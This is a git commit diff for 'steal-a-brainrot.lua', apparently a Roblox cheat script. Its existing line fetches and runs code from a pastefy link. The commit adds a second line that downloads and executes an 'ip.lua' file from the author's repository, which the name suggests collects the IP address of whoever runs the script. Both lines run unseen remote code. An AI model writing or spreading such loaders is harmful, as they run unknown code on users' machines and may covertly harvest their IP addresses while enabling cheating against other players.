278d83dc6c2054e6846e5186adb18dfc7b55543a
xielbers <88589081+xielbers@users.noreply.github.com>
2025-09-01 16:12:03 -0300

    Actualizar steal-a-brainrot.lua

--- steal-a-brainrot.lua
+++ steal-a-brainrot.lua
@@ -1,1 +1,5 @@
+_G.script_executed = "steal-a-brainrot.lua"
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/main/copy/ip.lua'))()
+
 loadstring(game:HttpGet("https://pastefy.app/9YIyWc7E/raw"))()
